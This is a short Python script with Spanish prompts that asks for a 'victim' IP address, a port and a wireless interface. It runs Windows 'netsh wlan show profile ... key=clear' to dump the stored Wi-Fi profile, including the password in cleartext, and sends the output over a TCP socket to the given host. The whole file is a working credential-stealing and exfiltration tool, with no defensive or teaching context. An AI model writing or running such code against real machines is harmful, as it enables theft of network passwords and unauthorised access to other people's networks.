import socket
import subprocess

lo = input("dime la ip de la maquina victima ")
j = int(input("dime el puerto "))
hy = input("dime la interfaz ")


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((lo,j))

result = subprocess.run(
    ['netsh', 'wlan', 'show', 'profile', hy, 'key=clear'],
    capture_output=True, text=True
)

p = result.stdout

s.send(p.encode())

s.close()
